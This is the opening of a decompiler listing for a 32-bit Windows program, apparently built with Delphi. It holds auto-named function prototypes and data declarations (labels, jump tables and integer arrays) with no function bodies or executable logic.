// int __usercall sub_40FAD4@<eax>(int@<eax>, char *@<edx>, char *@<ecx>);
// int __usercall sub_40FB60@<eax>(int@<eax>);
// int __usercall sub_40FB94@<eax>(int len@<ecx>, char *buf@<edx>, int@<eax>);
// _DWORD *__usercall sub_40FBBC@<eax>(int@<eax>, char@<dl>);
// _DWORD *__usercall sub_40FBE8@<eax>(int@<eax>, char *@<edx>);
// int __usercall sub_40FC58@<eax>(int len@<ecx>, char *buf@<edx>, int@<eax>);
// int __usercall sub_40FC90@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// _DWORD *__usercall sub_40FCF0@<eax>(char **@<eax>, int@<edx>, volatile __int32 *@<ecx>);
// int __usercall sub_40FF04@<eax>(int len@<ecx>, char *buf@<edx>, int@<eax>);
// int __usercall sub_40FF2C@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_40FF88@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_40FF9C@<eax>(int@<eax>);
// u_long __usercall sub_41005C@<eax>(int@<eax>, u_long@<ecx>);
int __fastcall sub_410074(int, char **);
// int __usercall sub_410100@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_410188@<eax>(int@<eax>);
// _DWORD *__usercall sub_4101AC@<eax>(int@<eax>, volatile __int32 *@<edx>);
int sub_410E58();
void sub_410E88();
int sub_410EB4();
void sub_410EE4();
// _DWORD *__usercall sub_410F04@<eax>(volatile __int32 *@<eax>);
// int *__userpurge sub_411110@<eax>(char **@<eax>, int, int);
// int __usercall sub_4112E4@<eax>(_BYTE *@<eax>, _BYTE *@<edx>, char **@<ecx>);
// int __usercall sub_41137C@<eax>(_BYTE *@<eax>, _BYTE *@<edx>, char **@<ecx>);
// int __usercall sub_41140C@<eax>(_BYTE *@<eax>, char **@<edx>, int@<ebx>);
// int __usercall sub_4114A8@<eax>(int *@<eax>, char **@<edx>, int@<ebx>);
int sub_4115E0();
void sub_41163C();
// _DWORD *__usercall sub_411838@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_411894@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_4118CC@<eax>(int@<eax>);
// int __usercall sub_411E58@<eax>(int@<eax>, _BYTE *@<edx>, int@<ebx>, int@<edi>, int@<esi>);
// int __usercall sub_411F70@<eax>(int a1@<eax>, _BYTE *a2@<edx>);
// _DWORD *__userpurge sub_412048@<eax>(int@<eax>, char@<dl>, char@<cl>, int@<ebx>, int@<edi>, int@<esi>, volatile __int32 *);
// int __usercall sub_412184@<eax>(int@<eax>);
// _DWORD *__usercall sub_412240@<eax>(int@<eax>, volatile __int32 *@<edx>, int@<edi>);
// int __usercall sub_4122C8@<eax>(int *@<eax>, volatile __int32 *@<edx>, int@<ebx>, int@<edi>);
// _DWORD *__usercall sub_41238C@<eax>(volatile __int32 *@<eax>);
int sub_41243C();
void sub_412484();
// _DWORD *__usercall sub_412560@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_4125C4@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_412604@<eax>(int@<eax>);
// _DWORD *__usercall sub_412620@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_412708@<eax>(int@<eax>, char *@<edx>, int@<ebx>, int@<edi>, int@<esi>);
// _DWORD *__usercall sub_412844@<eax>(int@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *@<ebx>, int@<edi>, int@<esi>);
// int __usercall sub_412A08@<eax>(int@<eax>, int@<edi>);
int sub_412C80();
void sub_412CB0();
// _DWORD *__usercall sub_412D28@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_412DA0@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_412DD0@<eax>(int@<eax>, int@<ebx>, int@<edi>, int@<esi>);
// int __usercall sub_412EA0@<eax>(int@<eax>, int@<edi>);
// int __usercall sub_412F7C@<eax>(int@<eax>, int@<edi>, int@<esi>);
// int __usercall sub_412FB0@<eax>(int@<eax>, int@<edx>, int@<edi>);
// int __usercall sub_41306C@<eax>(int@<eax>, int@<edx>, int@<edi>);
// char __usercall sub_413128@<al>(int@<eax>, int@<edx>, int@<ebx>, int@<edi>);
// char __userpurge sub_413258@<al>(int@<eax>, int@<edx>, __int32@<ecx>, int@<ebx>, int@<edi>, int@<esi>, int);
int sub_413368();
void sub_413398();
// _DWORD *__usercall sub_41376C@<eax>(int@<eax>, char@<dl>, __int16@<cx>);
// void __usercall sub_4137A8(_DWORD *@<eax>, char@<dl>);
// void __usercall sub_4137CC(int@<eax>);
// void __usercall sub_4137D8(int@<eax>);
// signed int __usercall sub_413B3C@<eax>(signed int result@<eax>);
// char __usercall sub_413B4C@<al>(int@<eax>, volatile __int32 *@<edx>);
// char __usercall sub_413B5C@<al>(_BYTE *@<eax>, _DWORD *@<edx>);
// char __usercall sub_413D20@<al>(int@<eax>, volatile __int32 *@<edx>);
// char __usercall sub_413D30@<al>(_BYTE *@<eax>, _DWORD *@<edx>);
// int __usercall sub_413D40@<eax>(int@<eax>);
// char __usercall sub_413EE8@<al>(int@<eax>);
// int __usercall sub_413EF0@<eax>(int@<eax>);
// int __usercall sub_413F88@<eax>(int@<eax>);
// int __usercall sub_413F90@<eax>(int@<eax>);
// char __usercall sub_414070@<al>(int@<eax>);
// void __usercall sub_414078(int@<eax>);
// BOOL __usercall sub_4140A0@<eax>(int y@<ecx>, int x@<edx>, int@<eax>);
// bool __usercall sub_4140CC@<al>(int@<eax>);
// void __usercall sub_414128(int@<eax>);
// BOOL __usercall sub_414150@<eax>(int@<eax>, struct tagPOINT *@<edx>, DWORD@<ecx>);
// BOOL __usercall sub_414174@<eax>(int@<eax>, int *@<edx>);
// char __usercall sub_414194@<al>(int@<eax>);
// int __usercall sub_4141F0@<eax>(int@<eax>, int@<edx>);
// int __usercall sub_414244@<eax>(int result@<eax>, char@<dl>, DWORD@<ecx>);
// COLORREF __usercall sub_4142B8@<eax>(int@<eax>);
// int __usercall sub_4142E4@<eax>(int@<eax>);
// int __usercall sub_414314@<eax>(int@<eax>);
// void __usercall sub_414390(int **@<eax>);
// void __usercall sub_4143A8(int **@<eax>);
void sub_4143C0();
void sub_4143CC();
_DWORD *sub_4143D8();
_DWORD *sub_41442C();
// int __usercall sub_4144D4@<eax>(int@<eax>);
// HGDIOBJ __usercall sub_4144E4@<eax>(void *@<eax>, int *@<edx>, char@<cl>);
// int __usercall sub_414644@<eax>(__int16@<ax>);
// int __usercall sub_414664@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// HPALETTE __usercall sub_414678@<eax>(char *@<eax>);
int __cdecl sub_414775(int, ULONG_PTR);
// int __userpurge sub_414790@<eax>(BITMAPINFOHEADER *@<eax>, HGDIOBJ *@<edx>, struct _EXCEPTION_REGISTRATION_RECORD *@<ecx>, int *);
// int __usercall sub_41494C@<eax>(int result@<eax>);
// bool __usercall sub_414958@<al>(unsigned __int8 *@<eax>, unsigned __int8 *@<edx>, int);
// int __userpurge sub_4149E8@<eax>(int@<eax>, HICON *@<edx>, int@<ecx>, int *, int *, int);
// unsigned int __usercall sub_414CF0@<eax>(void *@<eax>, int@<edx>, int@<ecx>);
// int __userpurge sub_414DD4@<eax>(void *@<eax>, int *@<edx>, _DWORD *@<ecx>, int);
// bool __userpurge sub_414E38@<al>(LPBITMAPINFO lpbmi@<ecx>, HPALETTE hPal@<edx>, HBITMAP@<eax>, int, LPVOID lpvBits);
int nullsub_1(void); // weak
// int __usercall sub_414EEC@<eax>(int result@<eax>);
// BOOL __usercall sub_414EF8@<eax>(int@<eax>, HICON@<edx>, char@<cl>);
// _DWORD *__usercall sub_4150F4@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_41512C@<eax>(int result@<eax>, int@<ecx>);
char __cdecl sub_415144(int);
// int __usercall sub_41519C@<eax>(int@<eax>, int@<edx>);
// bool __usercall sub_4151E8@<al>(int a1@<eax>, int a2@<edx>);
int sub_41532C();
// char __usercall sub_415330@<al>(int@<eax>);
// _DWORD *__usercall sub_415334@<eax>(int@<eax>, char *@<edx>);
// int __userpurge sub_415388@<eax>(int result@<eax>, int@<ebx>, int, int, char, char);
// int __usercall sub_4153B0@<eax>(int@<eax>);
// _DWORD *__usercall sub_4153BC@<eax>(int@<eax>, char *@<edx>);
// _BYTE *__usercall sub_415418@<eax>(_BYTE *result@<eax>, char@<dl>);
// int __usercall sub_415428@<eax>(int@<eax>);
void sub_415434();
// void __usercall sub_4154E0(int@<eax>);
// int __usercall sub_415580@<eax>(int result@<eax>);
// _DWORD *__usercall sub_415584@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_4155A4@<eax>(_DWORD *@<eax>, char@<dl>);
// int __usercall sub_4155D4@<eax>(int@<eax>);
// _DWORD *__usercall sub_4155EC@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_415640@<eax>(_DWORD *@<eax>, char@<dl>);
// _DWORD *__usercall sub_415670@<eax>(int@<eax>, int@<edx>);
// BOOL __usercall sub_4156D0@<eax>(HICON@<eax>, int@<edx>, int *@<ecx>);
// bool __usercall sub_415710@<al>(int@<eax>);
// int __usercall sub_415728@<eax>(HICON@<eax>);
// int __usercall sub_41573C@<eax>(int@<eax>);
// int __usercall sub_415750@<eax>(int@<eax>);
// HICON __usercall sub_415764@<eax>(HICON result@<eax>);
// _DWORD *__usercall sub_4157DC@<eax>(_DWORD *result@<eax>);
// int __usercall sub_415890@<eax>(int@<eax>, int@<edx>);
// _DWORD *__usercall sub_415948@<eax>(int@<eax>, int@<edx>, int@<ecx>);
// int __usercall sub_4159BC@<eax>(int@<eax>, int@<edx>);
// void __usercall sub_4159D4(int@<eax>, int@<edx>);
// void __usercall sub_4159F0(int@<eax>, int@<edx>);
// void __usercall sub_415A08(_DWORD *@<eax>, int@<edx>);
void __stdcall sub_415A34(int);
void __stdcall sub_415A48(int);
HPALETTE sub_415A5C();
// int __usercall sub_415A94@<eax>(int@<ebx>);
// char __usercall sub_415AD8@<al>(int@<ebx>);
// _DWORD *__usercall sub_415BA8@<eax>(int@<eax>, char@<dl>);
// void __usercall sub_415BE0(_DWORD *@<eax>, char@<dl>);
// void __usercall sub_415C0C(int@<eax>);
// void __usercall sub_415C18(int@<eax>);
// _DWORD *__usercall sub_415C24@<eax>(int@<eax>);
int sub_415C9C();
// void __usercall sub_415D70(int@<ebx>);
// BOOL __stdcall InternetGetConnectedState(LPDWORD lpdwFlags, DWORD dwReserved);
int sub_415E74();
void sub_415EA4();
// int __userpurge sub_415EAC@<eax>(int@<eax>, char *@<edx>, char *@<ecx>, volatile __int32 *, int, int);
// _DWORD *__usercall sub_415FAC@<eax>(int@<eax>, int@<edx>, volatile __int32 *@<ecx>);
// int __usercall sub_41609C@<eax>(int@<eax>, char **@<edx>);
// int __usercall sub_416178@<eax>(char *@<eax>, char *@<edx>, char@<cl>);
// int __usercall sub_41620C@<eax>(int@<eax>, char **@<edx>);
// int __usercall sub_4162DC@<eax>(int@<eax>, int@<edx>, int *@<ecx>);
// _DWORD *__userpurge sub_41639C@<eax>(int@<eax>, int@<edx>, int@<ecx>, int, int);
// int __userpurge sub_416478@<eax>(char *@<eax>, char *@<edx>, char *@<ecx>, char, int, int, int, int, int, char *);
// _DWORD *__userpurge sub_41692C@<eax>(int@<eax>, int@<edx>, int *@<ecx>, volatile __int32 *);
// int __userpurge sub_416A1C@<eax>(char *@<eax>, int *@<edx>, int@<ecx>, volatile __int32 *);
// int __usercall sub_416B20@<eax>(char *@<eax>, char *@<edx>, int@<ecx>);
// int __usercall sub_416C54@<eax>(char *@<eax>, int@<edx>);
// int __usercall sub_417118@<eax>(char *@<eax>);
// int __userpurge sub_4171C0@<eax>(char *@<eax>, char *@<edx>, char *@<ecx>, char, int, int, int);
_DWORD *__cdecl sub_4173F0(int);
// int __usercall sub_4174BC@<eax>(int@<eax>);
// int __usercall sub_4175AC@<eax>(int@<ebx>, int@<edi>, int@<esi>);
// int __usercall sub_4177BC@<eax>(int@<eax>, int@<edi>);
// int __userpurge sub_417928@<eax>(char *@<eax>, char *@<edx>, int@<ecx>, int);
// _DWORD *__usercall sub_417C20@<eax>(char *@<eax>, int@<edx>, int@<ecx>, int);
// int __userpurge sub_417C88@<eax>(char *@<eax>, int@<edx>, int@<ecx>, int@<edi>, int, int);
// int __userpurge sub_417D9C@<eax>(char *@<eax>, char *@<edx>, char *@<ecx>, int, int, int);
// int *__usercall sub_417F24@<eax>(int@<eax>, int@<edi>);
// int __usercall sub_418438@<eax>(char *@<eax>, char *@<edx>);
// _DWORD *__usercall sub_4184C4@<eax>(struct _NETRESOURCEA *@<eax>, int);
// int __usercall sub_418880@<eax>(char *@<eax>);
// int __userpurge sub_418C48@<eax>(char *@<eax>, int@<edx>, int@<ebx>, int@<esi>, __int64);
// _DWORD *__usercall sub_418DC8@<eax>(char *@<eax>);
// char __usercall sub_418E24@<al>(char *@<eax>, char *@<edx>, FARPROC *@<ecx>);
// int __usercall sub_418EBC@<eax>(char@<al>, int@<ebx>);
// char __usercall sub_418FB8@<al>(int a1@<eax>, int a2@<edi>, int a3@<esi>);
// char __usercall sub_418FBC@<al>(int@<eax>, int@<edi>, int@<esi>);
// volatile __int32 *__usercall sub_419074@<eax>(volatile __int32 *@<eax>);
// int __usercall sub_4190CC@<eax>(int@<edi>, int@<esi>);
// int __usercall sub_41A5E4@<eax>(int@<ebx>, int@<edi>, int@<esi>);
// _DWORD *__usercall sub_41A77C@<eax>(int@<eax>, volatile __int32 *@<edx>);
int __thiscall sub_41A7EC(int (__stdcall *this)());
int sub_41A848();
// void __usercall __noreturn start(int@<edi>);

//-------------------------------------------------------------------------
// Data declarations

int dword_401004[2] = { 1951598090, 1735289202 }; // weak
_UNKNOWN loc_4019BA; // weak
_UNKNOWN loc_4019C1; // weak
_UNKNOWN loc_401A9E; // weak
_UNKNOWN loc_401AA5; // weak
_UNKNOWN loc_40214C; // weak
_UNKNOWN loc_402153; // weak
_UNKNOWN loc_4022F2; // weak
_UNKNOWN loc_4022F9; // weak
_UNKNOWN loc_402585; // weak
_UNKNOWN loc_40258C; // weak
char byte_402641[] = { '' }; // weak
_UNKNOWN loc_402AF9; // weak
_UNKNOWN loc_402B00; // weak
_UNKNOWN loc_402F0B; // weak
_UNKNOWN loc_402F37; // weak
_UNKNOWN loc_402F90; // weak
_UNKNOWN loc_402FFF; // weak
_UNKNOWN loc_403141; // weak
_UNKNOWN loc_403226; // weak
_UNKNOWN loc_403286; // weak
char byte_4038ED = '\0'; // weak
_UNKNOWN loc_404028; // weak
_UNKNOWN loc_40416C; // weak
_UNKNOWN loc_404173; // weak
_UNKNOWN loc_404301; // weak
_UNKNOWN loc_404366; // weak
_UNKNOWN loc_404377; // weak
_UNKNOWN loc_4048E4; // weak
_UNKNOWN loc_4048EB; // weak
const CHAR byte_404A10[4] = { '\0', '\0', '\0', '\0' }; // idb
_UNKNOWN loc_404ADF; // weak
_UNKNOWN loc_404B74; // weak
_UNKNOWN loc_404B7B; // weak
int dword_4050ED = 3; // weak
_UNKNOWN loc_405876; // weak
_UNKNOWN loc_405968; // weak
int dword_405974 = 0; // weak
_UNKNOWN loc_405AD9; // weak
_UNKNOWN loc_405EE1; // weak
_UNKNOWN loc_4061B1; // weak
int dword_4061D8[5] = { 1398016526, 1668440421, 1667584616, 344, 1 }; // weak
int dword_406240[2] = { 14, 65536 }; // weak
int dword_406304[4] = { 1968129292, 1298550644, 1919905125, 4230521 }; // weak
int dword_406360[3] = { 1850295563, 1165260111, 1919906418 }; // weak
int dword_4063B8[3] = { 2017805577, 1852990836, -1064604575 }; // weak
int dword_406410[5] = { 2017805586, 1852990836, 2017815649, 1953523043, -1871810711 }; // weak
int dword_40678C[4] = { 1850295567, 1768710518, 1768902756, 1919251566 }; // weak
int dword_406844[4] = { 1866679565, 1919252078, 1920091508, -1064603025 }; // weak
int dword_4068A0[5] = { 1665221904, 1936942435, 1819240790, 1869182049, 4230510 }; // weak
int dword_406A68[5] = { 1933657360, 1953654131, 1181642601, 1701603681, 4230500 }; // weak
int dword_406AC8[4] = { 1648444686, 1634890867, 1917154403, -1871548558 }; // weak
int dword_406B80[3] = { 1767326987, 1160917870, 1919906418 }; // weak
_UNKNOWN unk_406BFC; // weak
int dword_406C68[2] = { 14, 65536 }; // weak
_UNKNOWN loc_406D26; // weak
_UNKNOWN loc_406D2D; // weak
int dword_407018 = 25637; // weak
_UNKNOWN loc_40739B; // weak
_UNKNOWN loc_4073A2; // weak
int dword_4073B4 = 3824686; // weak
int dword_4073E8 = 14940; // weak
int dword_407420 = 14940; // weak
_UNKNOWN loc_407D1D; // weak
_UNKNOWN loc_407D24; // weak
_UNKNOWN loc_407EF0; // weak
_UNKNOWN loc_407EF7; // weak
_UNKNOWN loc_408386; // weak
_UNKNOWN loc_40838D; // weak
int dword_40839C = 26471; // weak
_UNKNOWN loc_40847E; // weak
_UNKNOWN loc_408485; // weak
int dword_408494[3] = { 31097, -1, 4 }; // weak
_UNKNOWN loc_408BE9; // weak
_UNKNOWN loc_408BF0; // weak
void *off_408C14 = &loc_414141; // weak
int dword_408C18 = 32; // weak
int dword_408C74 = 67; // weak
_UNKNOWN loc_408EAF; // weak
_UNKNOWN loc_408EB6; // weak
_UNKNOWN loc_408F61; // weak
_UNKNOWN loc_408F68; // weak
_UNKNOWN loc_40900B; // weak
_UNKNOWN loc_409012; // weak
int dword_409020 = 49; // weak
_UNKNOWN loc_4091E6; // weak
_UNKNOWN loc_4091ED; // weak
int dword_4091FC = 49; // weak
int dword_409200[3] = { 26471, -1, 3 }; // weak
int dword_40920C = 6776679; // weak
int dword_409234[3] = { 25957, -1, 1 }; // weak
int dword_409240 = 101; // weak
int dword_4093D0 = 0; // weak
int dword_4093D4 = 46; // weak
_UNKNOWN loc_4094E6; // weak
_UNKNOWN loc_4094ED; // weak
_UNKNOWN loc_4095B4; // weak
_UNKNOWN loc_4095BB; // weak
int dword_4095EC[4] = { 1163135246, 1919906418, 140731730, 16777216 }; // weak
int dword_40966C[5] = { 1163135502, 1885692792, 1667584628, 8, 1 }; // weak
_UNKNOWN loc_409768; // weak
_UNKNOWN loc_40976F; // weak
_UNKNOWN loc_409A1F; // weak
_UNKNOWN loc_409A26; // weak
_UNKNOWN loc_409AEB; // weak
_UNKNOWN loc_409AF2; // weak
_UNKNOWN loc_409BCD; // weak
_UNKNOWN loc_409BD4; // weak
_UNKNOWN loc_40A2EB; // weak
_UNKNOWN loc_40A2F2; // weak
int dword_40A300[3] = { 48, -1, 6 }; // weak
int dword_40A334[3] = { 28001, -1, 2 }; // weak
int dword_40A340[3] = { 28016, -1, 1 }; // weak
int dword_40A34C[3] = { 104, -1, 2 }; // weak
int dword_40A358[3] = { 26728, -1, 5 }; // weak
_UNKNOWN loc_40A422; // weak
_UNKNOWN loc_40A429; // weak
int dword_40A5FC = 29; // weak
int dword_40A6E8 = 40; // weak
int dword_40A8C8[] = { 0 }; // weak
int (*funcs_40A97A[5])() = { &sub_40A9B6, &sub_40AA18, &sub_40AA8B, &sub_40AA8B, &sub_40AAF1 }; // weak
_UNKNOWN loc_40B2CA; // weak
_UNKNOWN loc_40B33C; // weak
int dword_40B350 = 30768; // weak
_UNKNOWN loc_40B379; // weak
_UNKNOWN loc_40B3B1; // weak
_UNKNOWN loc_40B499; // weak
_UNKNOWN loc_40B51E; // weak
int dword_40B5D8[4] = { 1128678669, 1952540018, 1920091493, -1064603025 }; // weak
int dword_40B634[3] = { 1330005259, 1164862832, 1919906418 }; // weak
int dword_40B6E4[3] = { 1699890442, 1917150305, -1871548558 }; // weak
int dword_40B73C[3] = { 1918321931, 1164276841, 1919906418 }; // weak
int dword_40B794[3] = { 1766606090, 1917154419, -1871548558 }; // weak
int dword_40B7EC[5] = { 1951614224, 1735289202, 1953720652, 1869771333, 4230514 }; // weak
int dword_40B84C[4] = { 1968129295, 1382436724, 1970238309, 1936024434 }; // weak
int dword_40B8A8[5] = { 1850295569, 1768710518, 1701859172, 1769234802, -1064604049 }; // weak
void *off_40B908 = &loc_40C234; // weak
int dword_40B96C[3] = { 1750357003, 1684104562, 1953720652 }; // weak
void *off_40BA94 = &loc_40C630; // weak
int dword_40BB48[5] = { 1398016782, 1852404340, 1702119783, 2157, 256 }; // weak
void *off_40BBB4 = &loc_40C630; // weak
int (*off_40BD88[4])() = { &sub_40D920, &sub_40D8F4, &sub_40D904, &sub_40D914 }; // weak
int (*off_40BE60[5])() = { &sub_40DB7C, &sub_40DA28, &sub_40DC2C, &sub_40DA60, &sub_40DBA8 }; // weak
int dword_40BE88[6] = { 1230245390, 1953391972, 1164992845, 2037544046, 8, 1 }; // weak
_UNKNOWN loc_40BF60; // weak
_UNKNOWN loc_40BF67; // weak
int dword_40BFBC[3] = { 1850299401, 1852785524, -1064602509 }; // weak
_UNKNOWN loc_40C200; // weak
_UNKNOWN loc_40C207; // weak
_UNKNOWN loc_40C415; // weak
_UNKNOWN loc_40C4A4; // weak
_UNKNOWN loc_40C4AB; // weak
_UNKNOWN loc_40C507; // weak
_UNKNOWN loc_40C50E; // weak
_UNKNOWN loc_40C616; // weak
_UNKNOWN loc_40C61D; // weak
int dword_40C62C = 7104878; // weak
_UNKNOWN loc_40C6D1; // weak
_UNKNOWN loc_40C6D8; // weak
_UNKNOWN loc_40C7F2; // weak
_UNKNOWN loc_40C7F9; // weak
_UNKNOWN loc_40C80F; // weak
_UNKNOWN loc_40C816; // weak
_UNKNOWN loc_40C879; // weak
_UNKNOWN loc_40C88A; // weak
_UNKNOWN loc_40C9F5; // weak
_UNKNOWN loc_40C9FC; // weak
_UNKNOWN loc_40CA8C; // weak
_UNKNOWN loc_40CA93; // weak
_UNKNOWN loc_40CB52; // weak
_UNKNOWN loc_40CB59; // weak
_UNKNOWN loc_40CB74; // weak
_UNKNOWN loc_40CB7B; // weak
_UNKNOWN loc_40CBD5; // weak
_UNKNOWN loc_40CBDC; // weak
_UNKNOWN loc_40CCBB; // weak
_UNKNOWN loc_40CCC2; // weak
_UNKNOWN loc_40CD39; // weak
_UNKNOWN loc_40CD40; // weak
_UNKNOWN loc_40CDC4; // weak
_UNKNOWN loc_40CDCB; // weak
_UNKNOWN loc_40CE51; // weak
_UNKNOWN loc_40CE58; // weak
_UNKNOWN loc_40CE6E; // weak
_UNKNOWN loc_40CE75; // weak
_UNKNOWN loc_40CF00; // weak
_UNKNOWN loc_40CF07; // weak
_UNKNOWN loc_40CF1D; // weak
_UNKNOWN loc_40CF24; // weak
_UNKNOWN loc_40CFDF; // weak
_UNKNOWN loc_40CFE6; // weak
_UNKNOWN loc_40D004; // weak
_UNKNOWN loc_40D00B; // weak
_UNKNOWN loc_40D05B; // weak
_UNKNOWN loc_40D062; // weak
_UNKNOWN loc_40D0B5; // weak
_UNKNOWN loc_40D0BC; // weak
_UNKNOWN loc_40D13F; // weak
_UNKNOWN loc_40D146; // weak
_UNKNOWN loc_40D1E3; // weak
_UNKNOWN loc_40D1EA; // weak
_UNKNOWN loc_40D200; // weak
_UNKNOWN loc_40D207; // weak
_UNKNOWN loc_40D286; // weak
_UNKNOWN loc_40D28D; // weak
_UNKNOWN loc_40DB48; // weak
_UNKNOWN loc_40DB4F; // weak
_UNKNOWN loc_40DD17; // weak
_UNKNOWN loc_40DD1E; // weak
_UNKNOWN loc_40DD9F; // weak
_UNKNOWN loc_40DDA6; // weak
_UNKNOWN loc_40DF9C; // weak
_UNKNOWN loc_40DFA3; // weak
_UNKNOWN loc_40E209; // weak
_UNKNOWN loc_40E210; // weak
_UNKNOWN loc_40E251; // weak
_UNKNOWN loc_40E258; // weak
_UNKNOWN loc_40E3B1; // weak
_UNKNOWN loc_40E3B8; // weak
_UNKNOWN loc_40E47C; // weak
_UNKNOWN loc_40E550; // weak
int dword_40E5B0[5] = { 1699890450, 1953720679, 2017818994, 1953523043, -1871810711 }; // weak
int dword_40E610[2] = { 14, 65536 }; // weak
_UNKNOWN loc_40E8CD; // weak
_UNKNOWN loc_40E8D4; // weak
_UNKNOWN loc_40EB48; // weak
_UNKNOWN loc_40EB89; // weak
_UNKNOWN loc_40EE9C; // weak
_UNKNOWN loc_40EEA3; // weak
_UNKNOWN loc_40F334; // weak
_UNKNOWN loc_40F33B; // weak
_UNKNOWN loc_40F36D; // weak
_UNKNOWN loc_40F48F; // weak
_UNKNOWN loc_40F496; // weak
int dword_40F4A0[4] = { -2, 0, 0, 0 }; // weak
int dword_40F4C8 = 61; // weak
_UNKNOWN loc_40F5FA; // weak
_UNKNOWN loc_40F601; // weak
_UNKNOWN loc_40F679; // weak
_UNKNOWN loc_40F779; // weak
int dword_40F7D8[2] = { 14, 65536 }; // weak
int (*off_40F8D4)() = &sub_410188; // weak
_UNKNOWN loc_40FA7D; // weak
_UNKNOWN loc_40FA84; // weak
_UNKNOWN loc_40FB53; // weak
_UNKNOWN loc_40FB5A; // weak
_UNKNOWN loc_40FC4B; // weak
_UNKNOWN loc_40FC52; // weak
_UNKNOWN loc_40FEDB; // weak
_UNKNOWN loc_40FEE2; // weak
int dword_40FEF4[3] = { 10, -1, 2 }; // weak
int dword_40FF00 = 2573; // weak
_UNKNOWN loc_41002B; // weak
_UNKNOWN loc_410032; // weak
_UNKNOWN loc_4100DF; // weak
_UNKNOWN loc_41074A; // weak
_UNKNOWN loc_410751; // weak
int dword_410760[3] = { 19279, -1, 23 }; // weak
_UNKNOWN loc_410E7D; // weak
_UNKNOWN loc_410ED9; // weak
_UNKNOWN loc_410FF1; // weak
_UNKNOWN loc_410FF8; // weak
int dword_411008[3] = { 43, -1, 1 }; // weak
int dword_411014[3] = { 45, -1, 8 }; // weak
_UNKNOWN loc_4112A2; // weak
_UNKNOWN loc_4112A9; // weak
_UNKNOWN loc_41136E; // weak
_UNKNOWN loc_411375; // weak
_UNKNOWN loc_4113FC; // weak
_UNKNOWN loc_411403; // weak
_UNKNOWN loc_411481; // weak
_UNKNOWN loc_411488; // weak
int dword_411498[3] = { 60, -1, 1 }; // weak
int dword_4114A4 = 62; // weak
_UNKNOWN loc_4115A2; // weak
_UNKNOWN loc_4115A9; // weak
int dword_4115B8[3] = { 34, -1, 1 }; // weak
int dword_4115C4[3] = { 40, -1, 1 }; // weak
int dword_4115D0[3] = { 41, -1, 1 }; // weak
int dword_4115DC = 60; // weak
_UNKNOWN loc_411631; // weak
int dword_411690[2] = { 14, 458752 }; // weak
_UNKNOWN loc_411CA9; // weak
_UNKNOWN loc_411CB0; // weak
_UNKNOWN loc_411CD8; // weak
_UNKNOWN loc_411CDF; // weak
int dword_411CF0[3] = { 61, -1, 5 }; // weak
int dword_411E18[3] = { 32, -1, 7 }; // weak
_UNKNOWN loc_411F2F; // weak
_UNKNOWN loc_411F36; // weak
int dword_411F48[3] = { 46, -1, 11 }; // weak
_UNKNOWN loc_412008; // weak
_UNKNOWN loc_41200F; // weak
_UNKNOWN loc_412143; // weak
_UNKNOWN loc_41214A; // weak
int dword_41215C[3] = { 3158589, -1, 2 }; // weak
_UNKNOWN loc_41220E; // weak
_UNKNOWN loc_412215; // weak
int dword_412220[4] = { -2, 0, 0, 0 }; // weak
_UNKNOWN loc_4122B8; // weak
_UNKNOWN loc_4122BF; // weak
_UNKNOWN loc_41235C; // weak
_UNKNOWN loc_412363; // weak
_UNKNOWN loc_4123F2; // weak
_UNKNOWN loc_4123F9; // weak
_UNKNOWN loc_412478; // weak
int dword_412544[2] = { 14, 65536 }; // weak
_UNKNOWN loc_4126BE; // weak
_UNKNOWN loc_4126C5; // weak
_UNKNOWN loc_4127DC; // weak
_UNKNOWN loc_4127E3; // weak
int dword_4127F4[3] = { 32, -1, 22 }; // weak
_UNKNOWN loc_412981; // weak
_UNKNOWN loc_412988; // weak
_UNKNOWN loc_4129AB; // weak
_UNKNOWN loc_4129B2; // weak
int dword_4129C4[3] = { 11565, -1, 9 }; // weak
_UNKNOWN loc_412B7A; // weak
_UNKNOWN loc_412B81; // weak
_UNKNOWN loc_412CA5; // weak
int dword_412D04[2] = { 14, 131072 }; // weak
_UNKNOWN loc_412E81; // weak
_UNKNOWN loc_412E88; // weak
int dword_412E9C = 45; // weak
_UNKNOWN loc_412F3F; // weak
_UNKNOWN loc_412F46; // weak
_UNKNOWN loc_41302F; // weak
_UNKNOWN loc_413036; // weak
_UNKNOWN loc_4130EB; // weak
_UNKNOWN loc_4130F2; // weak
_UNKNOWN loc_413212; // weak
_UNKNOWN loc_413219; // weak
int dword_41323C[3] = { 46, -1, 2 }; // weak
int dword_413248[3] = { 2573, -1, 3 }; // weak
_UNKNOWN loc_413333; // weak
_UNKNOWN loc_41333A; // weak
_UNKNOWN loc_413355; // weak
_UNKNOWN loc_41335C; // weak
_UNKNOWN loc_41338D; // weak
int dword_4133A4[5] = { 1129580033, 1919904879, 4, -128, 4230527 }; // weak
int dword_413404[4] = { 1850295567, 1768710518, 1634879332, 1667852400 }; // weak
int dword_413460[7] =
{
  1850295576,
  1768710518,
  1634879332,
  1667852400,
  1919250511,
  1869182049,
  4230510
}; // weak
int dword_413480[6] = { 1179913217, 1131703919, 1936875880, 95333, -16777216, -1879048192 }; // weak
void *off_4134E4 = &loc_40C630; // weak
int (*off_413628)() = &sub_4155D4; // weak
void *off_413684 = &loc_40C630; // weak
int dword_413758[5] = { 1699894288, 1920298867, 1632462179, 1701273966, 4230514 }; // weak
_UNKNOWN loc_413EA1; // weak
_UNKNOWN loc_413EA8; // weak
_UNKNOWN loc_413EC9; // weak
_UNKNOWN loc_413ED0; // weak
_UNKNOWN loc_413F76; // weak
_UNKNOWN loc_413F7D; // weak
_UNKNOWN loc_41405D; // weak
_UNKNOWN loc_414064; // weak
